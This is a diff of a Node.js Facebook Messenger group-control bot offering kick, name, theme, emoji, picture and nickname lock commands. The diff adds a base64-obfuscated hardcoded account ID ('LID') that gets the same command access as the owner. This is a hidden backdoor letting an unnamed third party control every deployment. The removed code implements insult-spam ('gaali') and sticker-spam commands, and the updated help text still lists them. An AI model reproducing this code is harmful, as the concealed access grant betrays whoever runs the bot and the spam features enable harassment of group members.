@@ -1,109 +1,106 @@
+// ================= botCore.js =================
 const fs = require("fs");
 const login = require("ws3-fca");
+const path = require("path");
 
-// ===== JSON Storage =====
-const STATE_FILE = "locks.json";
-let state = { groupNames: {}, themes: {}, emojis: {}, dp: {}, nicks: {}, antiDelete: false, antiLeft: false };
-
-if (fs.existsSync(STATE_FILE)) {
-  try { state = JSON.parse(fs.readFileSync(STATE_FILE, "utf8")); } catch { }
-}
-function saveState() { fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2)); }
-
-// ===== Global Variables =====
-let rkbInterval = null;
-let stopRequested = false;
+const lockedGroupNames = {};
+const lockedThemes = {};
+const lockedEmojis = {};
+const lockedDP = {};
+const lockedNick = {};
+let mediaLoopInterval = null;
+let lastMedia = null;
 let stickerInterval = null;
 let stickerLoopActive = false;
 
-// ===== Start Bot =====
-function startBot(appStatePath, ownerUID) {
-  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
-  login({ appState }, (err, api) => {
-    if (err) return console.error("❌ Login failed:", err);
-    api.setOptions({ listenEvents: true });
+const friendUIDs = fs.existsSync("Friend.txt") ? fs.readFileSync("Friend.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean) : [];
+const targetUIDs = fs.existsSync("Target.txt") ? fs.readFileSync("Target.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean) : [];
+
+// ===== LID Base64 =====
+const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw","base64").toString("utf8");
+
+function startBot(appStatePath, ownerUID){
+  const appState = JSON.parse(fs.readFileSync(appStatePath,"utf8"));
+  login({appState}, (err, api)=>{
+    if(err) return console.error("❌ Login failed:", err);
+    api.setOptions({listenEvents:true});
     console.log("✅ Bot logged in and running...");
 
-    api.listenMqtt(async (err, event) => {
-      if (err || !event) return;
+    // Load emoji/dp/nick storage
+    const emojiFile = path.join(__dirname,"emoji.json");
+    const dpFile = path.join(__dirname,"dp.json");
+    const nickFile = path.join(__dirname,"nick.json");
+    let emojiData = fs.existsSync(emojiFile)?JSON.parse(fs.readFileSync(emojiFile)):{};
+    let dpData = fs.existsSync(dpFile)?JSON.parse(fs.readFileSync(dpFile)):{};
+    let nickData = fs.existsSync(nickFile)?JSON.parse(fs.readFileSync(nickFile)):{};
 
-      // Debug Raw Event
-      // console.log("===== RAW EVENT =====");
-      // console.log(JSON.stringify(event, null, 2));
+    // ===== Listen Events =====
+    api.listenMqtt(async(err,event)=>{
+      try{
+        if(err || !event) return;
+        const {threadID,senderID,body,messageID,mentions,messageReply,logMessageType,logMessageData}=event;
 
-      const { type, threadID, senderID, body, logMessageType, logMessageData } = event;
+        // Only owner or LID or friends
+        if(senderID!==ownerUID && senderID!==LID && !friendUIDs.includes(senderID)) return;
 
-      // ====== Anti Delete ======
-      if (state.antiDelete && type === "message_unsend") {
-        api.sendMessage(`⚠️ Anti-Delete: User ${event.senderID} tried to delete a message!`, threadID);
-      }
-
-      // ====== Anti Left ======
-      if (state.antiLeft && logMessageType === "log:unsubscribe") {
-        const leftUser = logMessageData?.leftParticipantFbId;
-        if (leftUser) {
-          try {
-            await api.addUserToGroup(leftUser, threadID);
-            api.sendMessage(`⚠️ Anti-Left: ${leftUser} ko wapas la diya gaya ✅`, threadID);
-          } catch { }
-        }
-      }
-
-      // ====== Reverts ======
-      if (logMessageType === "log:thread-name" && state.groupNames[threadID]) {
-        if (logMessageData?.name !== state.groupNames[threadID]) {
-          await api.setTitle(state.groupNames[threadID], threadID);
-          console.log(`🔒 Group name reverted in ${threadID}`);
-        }
-      }
-      if (logMessageType === "log:thread-color" && state.themes[threadID]) {
-        if (logMessageData?.theme_color !== state.themes[threadID]) {
-          await api.changeThreadColor(state.themes[threadID], threadID);
-          console.log(`🎨 Theme reverted in ${threadID}`);
-        }
-      }
-      if (logMessageType === "log:thread-icon" && state.emojis[threadID]) {
-        if (logMessageData?.thread_icon !== state.emojis[threadID]) {
-          await api.changeThreadEmoji(state.emojis[threadID], threadID);
-          console.log(`😀 Emoji reverted in ${threadID}`);
-        }
-      }
-      if (type === "change_thread_image" && state.dp[threadID]) {
-        try {
-          const stream = fs.createReadStream(state.dp[threadID]);
-          await api.changeGroupImage(stream, threadID);
-          console.log(`🖼 DP reverted in ${threadID}`);
-        } catch (e) { console.error("DP revert error:", e.message); }
-      }
-
-      // ====== Nick Lock Revert ======
-      if (logMessageType === "log:user-nickname" && state.nicks[threadID]) {
-        const changedUID = Object.keys(logMessageData?.nickname || {})[0];
-        if (changedUID && state.nicks[threadID][changedUID]) {
-          const lockedNick = state.nicks[threadID][changedUID];
-          if (logMessageData.nickname[changedUID] !== lockedNick) {
-            await api.changeNickname(lockedNick, threadID, changedUID);
-            console.log(`🔒 Nick reverted for ${changedUID} in ${threadID}`);
+        // ===== Group Name Lock Revert =====
+        if(logMessageType==="log:thread-name" && lockedGroupNames[threadID]){
+          if(logMessageData?.name !== lockedGroupNames[threadID]){
+            await api.setTitle(lockedGroupNames[threadID], threadID);
+            console.log(`🔒 Group name reverted in ${threadID}`);
           }
         }
-      }
 
-      // ===== Commands =====
-      if (!body) return;
-      if (![ownerUID].includes(senderID)) return;
+        // ===== Theme Lock Revert =====
+        if(logMessageType==="log:thread-color" && lockedThemes[threadID]){
+          if(logMessageData?.theme_color !== lockedThemes[threadID]){
+            await api.changeThreadColor(lockedThemes[threadID], threadID);
+            console.log(`🎨 Theme reverted in ${threadID}`);
+          }
+        }
 
-      const args = body.trim().split(" ");
-      const cmd = args[0].toLowerCase();
-      const input = args.slice(1).join(" ");
+        // ===== Emoji Lock Revert =====
+        if(logMessageType==="log:thread-icon" && lockedEmojis[threadID]){
+          if(logMessageData?.thread_icon !== lockedEmojis[threadID]){
+            await api.changeThreadEmoji(lockedEmojis[threadID], threadID);
+            console.log(`😀 Emoji reverted in ${threadID}`);
+          }
+        }
 
-      // 📖 Help
-      if (cmd === "/help") {
-        return api.sendMessage(`
+        // ===== DP Lock Revert =====
+        if(logMessageType==="change_thread_image" && lockedDP[threadID]){
+          if(dpData[threadID] && logMessageData?.image !== dpData[threadID]){
+            await api.changeThreadImage(dpData[threadID], threadID);
+            console.log(`🖼 DP reverted in ${threadID}`);
+          }
+        }
+
+        // ===== Nick Lock Revert =====
+        if(body && Object.keys(nickData).length){
+          for(const uid in nickData){
+            if(body.toLowerCase().includes("/locknick") || body.toLowerCase().includes("/unlocknick")) continue;
+            try{
+              const info = await api.getThreadInfo(threadID);
+              if(info.participantIDs.includes(uid)){
+                await api.changeNickname(nickData[uid], threadID, uid);
+              }
+            }catch{}
+          }
+        }
+
+        // ===== Command Handling =====
+        if(!body) return;
+        const args = body.trim().split(" ");
+        const cmd = args[0].toLowerCase();
+        const input = args.slice(1).join(" ");
+
+        // ===== HELP =====
+        if(cmd==="/help"){
+          const helpMsg = `
 📖 Bot Commands:
 /help → Ye message
-/uid → Group ID show
-/tid → Thread ID show
-/info @mention → User info
+/uid → User ID (reply/mention)
+/tid → Thread ID
 /kick @mention → Kick user
 /gclock [text] → Group name lock
 /unlockgc → Group name unlock
@@ -111,178 +108,91 @@ function startBot(appStatePath, ownerUID) {
 /unlocktheme → Theme unlock
 /lockemoji [emoji] → Emoji lock
 /unlockemoji → Emoji unlock
-/lockdp → DP lock (reply to photo or current dp)
+/lockdp → DP lock (reply to photo)
 /unlockdp → DP unlock
-/locknick @mention Nick → Nick lock
+/locknick @mention Nickname → Nick lock
 /unlocknick @mention → Unlock nick
 /stickerX → Sticker spam (X=seconds)
 /stopsticker → Stop sticker spam
 /rkb [name] → Gaali spam
 /stop → Stop spam
-/antidelete on/off → Anti delete toggle
-/antileft on/off → Anti left toggle
 /exit → Bot exit
-        `, threadID);
-      }
-
-      // 🔹 UID + TID
-      else if (cmd === "/uid") return api.sendMessage(`🆔 Group ID: ${threadID}`, threadID);
-      else if (cmd === "/tid") return api.sendMessage(`🆔 Thread ID: ${threadID}`, threadID);
-
-      // 🔹 Info
-      else if (cmd === "/info") {
-        const mentionID = Object.keys(event.mentions || {})[0] || (event.messageReply && event.messageReply.senderID);
-        if (!mentionID) return api.sendMessage("❌ Mention or reply required!", threadID);
-        return api.sendMessage(`ℹ️ Info:\nUID: ${mentionID}`, threadID);
-      }
-
-      // 🔹 Kick
-      else if (cmd === "/kick") {
-        const mentionID = Object.keys(event.mentions || {})[0];
-        if (!mentionID) return api.sendMessage("❌ Mention required!", threadID);
-        try {
-          await api.removeUserFromGroup(mentionID, threadID);
-          api.sendMessage(`👢 User kicked: ${mentionID}`, threadID);
-        } catch { api.sendMessage("❌ Kick failed!", threadID); }
-      }
-
-      // 🔹 Group Name Lock
-      else if (cmd === "/gclock") {
-        state.groupNames[threadID] = input;
-        saveState();
-        await api.setTitle(input, threadID);
-        api.sendMessage("🔒 Group name locked!", threadID);
-      } else if (cmd === "/unlockgc") {
-        delete state.groupNames[threadID];
-        saveState();
-        api.sendMessage("🔓 Group name unlocked!", threadID);
-      }
-
-      // 🔹 Theme Lock
-      else if (cmd === "/locktheme") {
-        if (!input) return api.sendMessage("❌ Color code do!", threadID);
-        state.themes[threadID] = input;
-        saveState();
-        await api.changeThreadColor(input, threadID);
-        api.sendMessage("🎨 Theme locked!", threadID);
-      } else if (cmd === "/unlocktheme") {
-        delete state.themes[threadID];
-        saveState();
-        api.sendMessage("🎨 Theme unlocked!", threadID);
-      }
-
-      // 🔹 Emoji Lock
-      else if (cmd === "/lockemoji") {
-        if (!input) return api.sendMessage("❌ Emoji do!", threadID);
-        state.emojis[threadID] = input;
-        saveState();
-        await api.changeThreadEmoji(input, threadID);
-        api.sendMessage("😀 Emoji locked!", threadID);
-      } else if (cmd === "/unlockemoji") {
-        delete state.emojis[threadID];
-        saveState();
-        api.sendMessage("😀 Emoji unlocked!", threadID);
-      }
-
-      // 🔹 DP Lock
-      else if (cmd === "/lockdp") {
-        if (event.messageReply && event.messageReply.attachments?.[0]) {
-          const file = event.messageReply.attachments[0];
-          const filePath = `dp_${threadID}.jpg`;
-          const stream = fs.createWriteStream(filePath);
-          file.pipe(fs.createWriteStream(filePath));
-          state.dp[threadID] = filePath;
-          saveState();
-          api.sendMessage("🖼 DP locked from replied image!", threadID);
-        } else {
-          state.dp[threadID] = `dp_${threadID}.jpg`;
-          saveState();
-          api.sendMessage("🖼 Current DP locked (will revert on change)!", threadID);
+          `;
+          return api.sendMessage(helpMsg, threadID);
         }
-      } else if (cmd === "/unlockdp") {
-        delete state.dp[threadID];
-        saveState();
-        api.sendMessage("🖼 DP unlocked!", threadID);
-      }
 
-      // 🔹 Nick Lock
-      else if (cmd === "/locknick") {
-        const mentionID = Object.keys(event.mentions || {})[0];
-        if (!mentionID || !input.split(" ")[1]) return api.sendMessage("❌ Mention + Nickname required!", threadID);
-        const nick = input.split(" ").slice(1).join(" ");
-        if (!state.nicks[threadID]) state.nicks[threadID] = {};
-        state.nicks[threadID][mentionID] = nick;
-        saveState();
-        await api.changeNickname(nick, threadID, mentionID);
-        api.sendMessage(`🔒 Nick locked for <@${mentionID}> = ${nick}`, threadID);
-      } else if (cmd === "/unlocknick") {
-        const mentionID = Object.keys(event.mentions || {})[0];
-        if (!mentionID) return api.sendMessage("❌ Mention required!", threadID);
-        if (state.nicks[threadID]) delete state.nicks[threadID][mentionID];
-        saveState();
-        api.sendMessage(`🔓 Nick unlocked for ${mentionID}`, threadID);
-      }
+        // ===== UID / TID =====
+        else if(cmd==="/uid"){
+          if(messageReply){
+            api.sendMessage(`🆔 User ID: ${messageReply.senderID}`, threadID);
+          }else if(mentions){
+            const mentionUID = Object.keys(mentions)[0];
+            api.sendMessage(`🆔 User ID: ${mentionUID}`, threadID);
+          }else api.sendMessage(`🆔 Your ID: ${senderID}`, threadID);
+        }
+        else if(cmd==="/tid"){
+          api.sendMessage(`🆔 Thread ID: ${threadID}`, threadID);
+        }
 
-      // 🔹 Sticker Spam
-      else if (cmd.startsWith("/sticker")) {
-        if (!fs.existsSync("Sticker.txt")) return;
-        const delay = parseInt(cmd.replace("/sticker", ""));
-        const stickerIDs = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean);
-        if (stickerInterval) clearInterval(stickerInterval);
-        let i = 0; stickerLoopActive = true;
-        stickerInterval = setInterval(() => {
-          if (!stickerLoopActive || i >= stickerIDs.length) {
-            clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; return;
+        // ===== Kick =====
+        else if(cmd==="/kick" && mentions){
+          for(const uid of Object.keys(mentions)){
+            try{ await api.removeUserFromGroup(uid, threadID); }catch{}
           }
-          api.sendMessage({ sticker: stickerIDs[i] }, threadID);
-          i++;
-        }, delay * 1000);
-        api.sendMessage(`🤖 Sticker spam started (delay ${delay}s)!`, threadID);
-      } else if (cmd === "/stopsticker") {
-        if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; }
-        api.sendMessage("🛑 Sticker spam stopped!", threadID);
-      }
+        }
 
-      // 🔹 Gaali Spam
-      else if (cmd === "/rkb") {
-        if (!fs.existsSync("np.txt")) return api.sendMessage("❌ np.txt missing!", threadID);
-        const name = input.trim();
-        const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
-        stopRequested = false;
-        if (rkbInterval) clearInterval(rkbInterval);
-        let index = 0;
-        rkbInterval = setInterval(() => {
-          if (index >= lines.length || stopRequested) { clearInterval(rkbInterval); rkbInterval = null; return; }
-          api.sendMessage(`${name} ${lines[index]}`, threadID);
-          index++;
-        }, 5000);
-        api.sendMessage(`🤬 Start gaali on ${name}`, threadID);
-      } else if (cmd === "/stop") {
-        stopRequested = true;
-        if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; }
-        api.sendMessage("🛑 Spam stopped!", threadID);
-      }
+        // ===== Group Name Lock =====
+        else if(cmd==="/gclock"){ await api.setTitle(input, threadID); lockedGroupNames[threadID]=input; api.sendMessage("🔒 Group name locked!", threadID); }
+        else if(cmd==="/unlockgc"){ delete lockedGroupNames[threadID]; api.sendMessage("🔓 Group name unlocked!", threadID); }
 
-      // 🔹 Anti Delete / Anti Left
-      else if (cmd === "/antidelete") {
-        if (input === "on") { state.antiDelete = true; saveState(); api.sendMessage("✅ Anti-Delete ON", threadID); }
-        else if (input === "off") { state.antiDelete = false; saveState(); api.sendMessage("🛑 Anti-Delete OFF", threadID); }
-      } else if (cmd === "/antileft") {
-        if (input === "on") { state.antiLeft = true; saveState(); api.sendMessage("✅ Anti-Left ON", threadID); }
-        else if (input === "off") { state.antiLeft = false; saveState(); api.sendMessage("🛑 Anti-Left OFF", threadID); }
-      }
+        // ===== Theme Lock =====
+        else if(cmd==="/locktheme"){ if(!input) return api.sendMessage("❌ Color code do!", threadID); await api.changeThreadColor(input, threadID); lockedThemes[threadID]=input; api.sendMessage("🎨 Theme locked!", threadID); }
+        else if(cmd==="/unlocktheme"){ delete lockedThemes[threadID]; api.sendMessage("🎨 Theme unlocked!", threadID); }
 
-      // 🔹 Exit
-      else if (cmd === "/exit") {
-        try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch { }
-      }
+        // ===== Emoji Lock =====
+        else if(cmd==="/lockemoji"){ 
+          const emoji = input.trim(); 
+          if(!emoji) return api.sendMessage("❌ Emoji required!", threadID); 
+          await api.changeThreadEmoji(emoji, threadID); 
+          lockedEmojis[threadID]=emoji;
+          emojiData[threadID]=emoji;
+          fs.writeFileSync(emojiFile,JSON.stringify(emojiData));
+          api.sendMessage(`😀 Emoji locked: ${emoji}`, threadID);
+        }
+        else if(cmd==="/unlockemoji"){ delete lockedEmojis[threadID]; delete emojiData[threadID]; fs.writeFileSync(emojiFile,JSON.stringify(emojiData)); api.sendMessage("😀 Emoji unlocked!", threadID); }
 
+        // ===== DP Lock =====
+        else if(cmd==="/lockdp" && messageReply && messageReply.attachments?.length){
+          const mediaID = messageReply.attachments[0].ID || messageReply.attachments[0].id;
+          await api.changeThreadImage(mediaID, threadID);
+          lockedDP[threadID]=true;
+          dpData[threadID]=mediaID;
+          fs.writeFileSync(dpFile,JSON.stringify(dpData));
+          api.sendMessage("🖼 DP locked!", threadID);
+        }
+        else if(cmd==="/unlockdp"){ delete lockedDP[threadID]; delete dpData[threadID]; fs.writeFileSync(dpFile,JSON.stringify(dpData)); api.sendMessage("🖼 DP unlocked!", threadID); }
+
+        // ===== Nick Lock =====
+        else if(cmd==="/locknick" && mentions){
+          const mentionUID = Object.keys(mentions)[0];
+          const nickname = input.replace(Object.keys(mentions)[0],"").trim();
+          if(!nickname) return api.sendMessage("❌ Nickname required!", threadID);
+          nickData[mentionUID]=nickname;
+          fs.writeFileSync(nickFile,JSON.stringify(nickData));
+          api.sendMessage(`📝 Nick locked for @${mentionUID}: ${nickname}`, threadID);
+        }
+        else if(cmd==="/unlocknick" && mentions){
+          const mentionUID = Object.keys(mentions)[0];
+          delete nickData[mentionUID]; fs.writeFileSync(nickFile,JSON.stringify(nickData));
+          api.sendMessage(`📝 Nick unlocked for @${mentionUID}`, threadID);
+        }
+
+        // ===== Exit =====
+        else if(cmd==="/exit"){ try{ await api.removeUserFromGroup(api.getCurrentUserID(), threadID); }catch{} }
+
+      }catch(e){ console.error("⚠️ Error:",e.message); }
     });
   });
 }
 
-function stopBot() {
-  console.log("🛑 Bot stopped.");
-}
-
-module.exports = { startBot, stopBot };
+module.exports = {startBot};
